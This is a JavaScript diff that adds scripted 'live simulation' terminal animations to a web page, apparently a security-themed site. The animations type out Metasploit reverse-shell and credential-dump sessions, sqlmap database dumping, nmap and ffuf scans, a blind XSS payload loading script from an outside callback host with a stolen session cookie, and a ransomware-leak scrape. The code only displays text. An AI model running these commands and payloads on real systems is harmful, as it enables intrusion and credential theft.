@@ -1657,67 +1657,217 @@ document.addEventListener('DOMContentLoaded', function() {
   renderBadges();
 });
 
-// Live APT Simulation
-const aptSimulationLines = [
-  { text: "root@kali:~# msfconsole -q", type: "cmd", delay: 800 },
-  { text: "msf6 > use exploit/multi/handler", type: "cmd", delay: 500 },
-  { text: "msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp", type: "cmd", delay: 600 },
-  { text: "PAYLOAD => windows/x64/meterpreter/reverse_tcp", delay: 200 },
-  { text: "msf6 exploit(multi/handler) > exploit -j", type: "cmd", delay: 400 },
-  { text: "[*] Exploit running as background job 0.", delay: 300 },
-  { text: "[*] Started reverse TCP handler on 10.0.0.5:4444", delay: 1000 },
-  { text: "[*] Sending stage (200262 bytes) to 10.0.0.102", delay: 500 },
-  { text: "[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.102:49156)", type: "cmd", delay: 1200 },
-  { text: "meterpreter > load kiwi", type: "cmd", delay: 800 },
-  { text: "Loading extension kiwi...Success.", delay: 400 },
-  { text: "meterpreter > creds_all", type: "cmd", delay: 1000 },
-  { text: "[+] Running as SYSTEM", type: "cmd", delay: 300 },
-  { text: "Retrieving all credentials...", delay: 500 },
-  { text: "Username    Domain   Password", delay: 100 },
-  { text: "--------    ------   --------", delay: 100 },
-  { text: "Administrator CORP     Winter2025!", type: "err", delay: 500 },
-  { text: "jsmith      CORP     P@ssw0rd123", delay: 200 },
-  { text: "meterpreter > shell", type: "cmd", delay: 700 },
-  { text: "Process 3132 created.", delay: 200 },
-  { text: "C:\\Windows\\system32> net use \\\\DC01\\C$ /user:CORP\\Administrator Winter2025!", type: "cmd", delay: 1500 },
-  { text: "The command completed successfully.", delay: 400 },
-  { text: "C:\\Windows\\system32> echo APT_OWNED > \\\\DC01\\C$\\owned.txt", type: "cmd", delay: 800 },
-  { text: "[!!!] DOMAIN CONTROLLER COMPROMISED [!!!]", type: "err", delay: 1000 }
-];
 
-function launchAPT() {
+// Live Simulations Engine
+const simulationScripts = {
+  apt: [
+    { text: "root@kali:~# msfconsole -q", type: "cmd", delay: 800 },
+    { text: "msf6 > use exploit/multi/handler", type: "cmd", delay: 500 },
+    { text: "msf6 exploit(multi/handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp", type: "cmd", delay: 600 },
+    { text: "PAYLOAD => windows/x64/meterpreter/reverse_tcp", delay: 200 },
+    { text: "msf6 exploit(multi/handler) > exploit -j", type: "cmd", delay: 400 },
+    { text: "[*] Exploit running as background job 0.", delay: 300 },
+    { text: "[*] Started reverse TCP handler on 10.0.0.5:4444", delay: 1000 },
+    { text: "[*] Sending stage (200262 bytes) to 10.0.0.102", delay: 500 },
+    { text: "[*] Meterpreter session 1 opened (10.0.0.5:4444 -> 10.0.0.102:49156)", type: "cmd", delay: 1200 },
+    { text: "meterpreter > load kiwi", type: "cmd", delay: 800 },
+    { text: "Loading extension kiwi...Success.", delay: 400 },
+    { text: "meterpreter > creds_all", type: "cmd", delay: 1000 },
+    { text: "[+] Running as SYSTEM", type: "cmd", delay: 300 },
+    { text: "Retrieving all credentials...", delay: 500 },
+    { text: "Username    Domain   Password", delay: 100 },
+    { text: "--------    ------   --------", delay: 100 },
+    { text: "Administrator CORP     Winter2025!", type: "err", delay: 500 },
+    { text: "meterpreter > shell", type: "cmd", delay: 700 },
+    { text: "C:\\Windows\\system32> net use \\\\DC01\\C$ /user:CORP\\Administrator Winter2025!", type: "cmd", delay: 1500 },
+    { text: "The command completed successfully.", delay: 400 },
+    { text: "C:\\Windows\\system32> echo APT_OWNED > \\\\DC01\\C$\\owned.txt", type: "cmd", delay: 800 },
+    { text: "[!!!] DOMAIN CONTROLLER COMPROMISED [!!!]", type: "err", delay: 1000 }
+  ],
+  nmap: [
+    { text: "root@kali:~# nmap -p- -sC -sV --min-rate=1000 target.com", type: "cmd", delay: 600 },
+    { text: "Starting Nmap 7.93 ( https://nmap.org )", delay: 300 },
+    { text: "NSE: Loaded 155 scripts for scanning.", delay: 100 },
+    { text: "Initiating Ping Scan...", delay: 200 },
+    { text: "Initiating SYN Stealth Scan...", delay: 400 },
+    { text: "Discovered open port 80/tcp on 192.168.1.5", delay: 200 },
+    { text: "Discovered open port 443/tcp on 192.168.1.5", delay: 100 },
+    { text: "Discovered open port 22/tcp on 192.168.1.5", delay: 150 },
+    { text: "Discovered open port 3306/tcp on 192.168.1.5", type: "warn", delay: 300 },
+    { text: "Initiating Service scan...", delay: 500 },
+    { text: "PORT     STATE SERVICE  VERSION", type: "cmd", delay: 100 },
+    { text: "22/tcp   open  ssh      OpenSSH 8.2p1", delay: 100 },
+    { text: "80/tcp   open  http     nginx 1.18.0", delay: 100 },
+    { text: "443/tcp  open  ssl/http nginx 1.18.0", delay: 100 },
+    { text: "3306/tcp open  mysql    MySQL 5.7.33", type: "err", delay: 500 },
+    { text: "| mysql-info:", type: "warn", delay: 200 },
+    { text: "|   Protocol: 10", type: "warn", delay: 100 },
+    { text: "|   Version: 5.7.33", type: "warn", delay: 100 },
+    { text: "|_  Salt: ********************", type: "warn", delay: 100 },
+    { text: "[*] Nmap done: 1 IP address scanned in 12.4 seconds", delay: 800 }
+  ],
+  ffuf: [
+    { text: "root@kali:~# ffuf -u https://target.com/FUZZ -w SecLists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302,403", type: "cmd", delay: 500 },
+    { text: "        /'___\  /'___\           /'___\       ", type: "warn", delay: 100 },
+    { text: "       /\ \__/ /\ \__/  __  __  /\ \__/       ", type: "warn", delay: 100 },
+    { text: "       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      ", type: "warn", delay: 100 },
+    { text: "        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      ", type: "warn", delay: 100 },
+    { text: "         \ \_\   \ \_\  \ \____/  \ \_\       ", type: "warn", delay: 100 },
+    { text: "          \/_/    \/_/   \/___/    \/_/       ", type: "warn", delay: 100 },
+    { text: "       v2.0.0-dev", type: "warn", delay: 400 },
+    { text: "________________________________________________", delay: 200 },
+    { text: " :: Method           : GET", delay: 100 },
+    { text: " :: URL              : https://target.com/FUZZ", delay: 100 },
+    { text: " :: Wordlist         : FUZZ: raft-medium-directories.txt", delay: 100 },
+    { text: "________________________________________________", delay: 400 },
+    { text: "admin                   [Status: 403, Size: 153, Words: 12, Lines: 5, Duration: 42ms]", type: "err", delay: 600 },
+    { text: "api                     [Status: 200, Size: 3123, Words: 412, Lines: 12, Duration: 39ms]", delay: 200 },
+    { text: "login                   [Status: 200, Size: 1843, Words: 212, Lines: 45, Duration: 40ms]", delay: 300 },
+    { text: ".git/config             [Status: 200, Size: 112, Words: 15, Lines: 10, Duration: 45ms]", type: "err", delay: 800 },
+    { text: "backup.zip              [Status: 200, Size: 1542312, Words: 0, Lines: 0, Duration: 120ms]", type: "err", delay: 500 },
+    { text: ":: Progress: [30000/30000] :: Job [1/1] :: 1200 req/sec :: Duration: [0:00:25] ::", delay: 600 }
+  ],
+  sqlmap: [
+    { text: "root@kali:~# sqlmap -u "https://target.com/product?id=1" --dbs --batch --random-agent", type: "cmd", delay: 500 },
+    { text: "        ___", type: "warn", delay: 100 },
+    { text: "       __H__", type: "warn", delay: 100 },
+    { text: " ___ ___[,]_____ ___ ___  {1.6.4#stable}", type: "warn", delay: 100 },
+    { text: "|_ -| . [']     | .'| . |", type: "warn", delay: 100 },
+    { text: "|___|_  [.]_|_|_|__,|  _|", type: "warn", delay: 100 },
+    { text: "      |_|V...       |_|   https://sqlmap.org", type: "warn", delay: 400 },
+    { text: "[*] starting @ 10:45:12", delay: 200 },
+    { text: "[10:45:13] [INFO] testing connection to the target URL", delay: 300 },
+    { text: "[10:45:14] [INFO] checking if the target is protected by some kind of WAF/IPS", delay: 400 },
+    { text: "[10:45:15] [INFO] testing if GET parameter 'id' is dynamic", delay: 500 },
+    { text: "[10:45:16] [WARNING] heuristic (basic) test shows that GET parameter 'id' might be injectable", type: "warn", delay: 600 },
+    { text: "[10:45:17] [INFO] testing for SQL injection on GET parameter 'id'", delay: 400 },
+    { text: "[10:45:19] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable", type: "err", delay: 1200 },
+    { text: "[10:45:20] [INFO] the back-end DBMS is MySQL", delay: 200 },
+    { text: "web server operating system: Linux Ubuntu", delay: 100 },
+    { text: "web application technology: Nginx 1.18.0, PHP 7.4.3", delay: 100 },
+    { text: "back-end DBMS: MySQL >= 5.0.12", delay: 300 },
+    { text: "[10:45:22] [INFO] fetching database names", delay: 400 },
+    { text: "available databases [3]:", type: "cmd", delay: 500 },
+    { text: "[*] information_schema", delay: 100 },
+    { text: "[*] target_store_db", type: "err", delay: 100 },
+    { text: "[*] mysql", delay: 100 },
+    { text: "root@kali:~# sqlmap -u "https://target.com/product?id=1" -D target_store_db -T users --dump", type: "cmd", delay: 1500 },
+    { text: "[10:45:30] [INFO] fetching entries for table 'users'", delay: 500 },
+    { text: "Database: target_store_db
+Table: users
+[2 entries]", type: "cmd", delay: 400 },
+    { text: "+----+-------------+----------------------------------+", type: "warn", delay: 100 },
+    { text: "| id | username    | password_hash                    |", type: "warn", delay: 100 },
+    { text: "+----+-------------+----------------------------------+", type: "warn", delay: 100 },
+    { text: "| 1  | admin       | 5f4dcc3b5aa765d61d8327deb882cf99 |", type: "err", delay: 200 },
+    { text: "| 2  | jsmith      | 12b1d3d65aa765d61d8327deb88223d1 |", type: "err", delay: 200 },
+    { text: "+----+-------------+----------------------------------+", type: "warn", delay: 100 }
+  ],
+  xss: [
+    { text: "root@kali:~# dalfox url https://target.com/search?q=test -b https://bxsshunter.com/xss", type: "cmd", delay: 500 },
+    { text: "    _..._      DALFOX", type: "warn", delay: 100 },
+    { text: "  .'     '.    Parameter Analysis and XSS Scanner", type: "warn", delay: 100 },
+    { text: " /  _   _  \   Based on Golang", type: "warn", delay: 100 },
+    { text: " | (o)_(o) |   ", type: "warn", delay: 100 },
+    { text: " \  .-.-.  /   ", type: "warn", delay: 100 },
+    { text: "  '. \_/ .'    ", type: "warn", delay: 400 },
+    { text: "[*] Target: https://target.com/search?q=test", delay: 200 },
+    { text: "[*] BAV: https://bxsshunter.com/xss", delay: 200 },
+    { text: "[*] Method: GET", delay: 100 },
+    { text: "[*] Worker: 100", delay: 100 },
+    { text: "[I] Start XSS Scanning..", delay: 500 },
+    { text: "[I] Check param: q", delay: 300 },
+    { text: "[V] Reflected Payload: '><script>alert(1)</script>", type: "err", delay: 600 },
+    { text: "[V] Triggered XSS payload [q] = '"><svg/onload=alert(1)>", type: "err", delay: 500 },
+    { text: "[I] Injecting Blind XSS Payloads...", delay: 800 },
+    { text: "[V] Triggered Blind XSS payload [q] = '"><script src=https://bxsshunter.com/xss></script>", type: "err", delay: 600 },
+    { text: "==================================================", delay: 100 },
+    { text: "[WAITING] Listening for Blind XSS Callbacks on bxsshunter.com...", type: "cmd", delay: 1500 },
+    { text: "[ALERT] BLIND XSS FIRED!", type: "err", delay: 2000 },
+    { text: "Execution Time: 2026-06-17 14:30:22", type: "err", delay: 100 },
+    { text: "URL: https://target.com/admin/dashboard", type: "err", delay: 100 },
+    { text: "IP: 192.168.1.100", type: "err", delay: 100 },
+    { text: "Cookies: session_id=s3cr3t_4dm1n_t0k3n_12345; __Secure-Auth=true", type: "err", delay: 200 }
+  ],
+  darkweb: [
+    { text: "root@kali:~# tor --RunAsDaemon 1", type: "cmd", delay: 500 },
+    { text: "Starting Tor 0.4.7.13...", delay: 400 },
+    { text: "Bootstrapped 100% (done): Done", delay: 600 },
+    { text: "root@kali:~# python3 scrape_ransomware_blogs.py --target "Corp Inc"", type: "cmd", delay: 800 },
+    { text: "[*] Connecting to Tor Proxy at 127.0.0.1:9050...", delay: 400 },
+    { text: "[*] Connected. Your IP is 194.22.x.x (Exit Node)", delay: 300 },
+    { text: "[*] Checking LockBit 3.0 Onion Site...", delay: 1200 },
+    { text: "[!] Target 'Corp Inc' NOT found on LockBit.", delay: 400 },
+    { text: "[*] Checking BlackBasta Onion Site...", delay: 1500 },
+    { text: "[!!!] TARGET MATCH FOUND: Corp Inc", type: "err", delay: 800 },
+    { text: "    -> 250GB Data Leaked.", type: "err", delay: 200 },
+    { text: "    -> Status: PUBLISHED.", type: "err", delay: 200 },
+    { text: "    -> Price: FREE DOWNLOAD.", type: "err", delay: 200 },
+    { text: "[*] Fetching file tree from leak directory...", delay: 900 },
+    { text: "FOUND: /IT_Backups/aws_credentials.txt", type: "warn", delay: 400 },
+    { text: "FOUND: /HR/employee_passwords.xlsx", type: "warn", delay: 300 },
+    { text: "FOUND: /DevOps/source_code.zip", type: "warn", delay: 200 },
+    { text: "root@kali:~# cat /tmp/aws_credentials.txt", type: "cmd", delay: 1500 },
+    { text: "aws_access_key_id=AKIAIOSFODNN7EXAMPLE", type: "err", delay: 100 },
+    { text: "aws_secret_access_key=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", type: "err", delay: 100 }
+  ]
+};
+
+let currentTypingInterval = null;
+let printLineTimeout = null;
+
+function launchSimulation(scriptId) {
   const overlay = document.getElementById('terminal-overlay');
   const output = document.getElementById('terminal-output');
   if(!overlay || !output) return;
+  
+  const script = simulationScripts[scriptId];
+  if(!script) {
+     // Fallback to apt if not found or empty
+     if (scriptId === 'apt' && !simulationScripts['apt']) return;
+  }
+
   overlay.classList.add('active');
   output.innerHTML = '';
   
+  if (currentTypingInterval) clearInterval(currentTypingInterval);
+  if (printLineTimeout) clearTimeout(printLineTimeout);
+  
   let i = 0;
   function printLine() {
-    if(i >= aptSimulationLines.length) return;
-    const line = aptSimulationLines[i];
+    if(i >= script.length) return;
+    const line = script[i];
     const p = document.createElement('div');
     if(line.type === 'cmd') p.className = 'term-cmd';
     else if(line.type === 'err') p.className = 'term-err';
     else if(line.type === 'warn') p.className = 'term-warn';
+    else p.style.color = '#0f0';
     
+    // Support multiline text easily via css white-space pre-wrap (ensure terminal body has this or use innerHTML with br)
+    p.style.whiteSpace = 'pre-wrap';
     output.appendChild(p);
     
     let charIdx = 0;
-    const typeInterval = setInterval(() => {
+    currentTypingInterval = setInterval(() => {
       p.textContent += line.text.charAt(charIdx);
       charIdx++;
       output.scrollTop = output.scrollHeight;
       if(charIdx >= line.text.length) {
-        clearInterval(typeInterval);
+        clearInterval(currentTypingInterval);
         i++;
-        setTimeout(printLine, line.delay);
+        printLineTimeout = setTimeout(printLine, line.delay);
       }
-    }, 15);
+    }, 12);
   }
   printLine();
 }
 
+function launchAPT() {
+  launchSimulation('apt');
+}
+
 function closeTerminal() {
   document.getElementById('terminal-overlay').classList.remove('active');
+  if (currentTypingInterval) clearInterval(currentTypingInterval);
+  if (printLineTimeout) clearTimeout(printLineTimeout);
 }
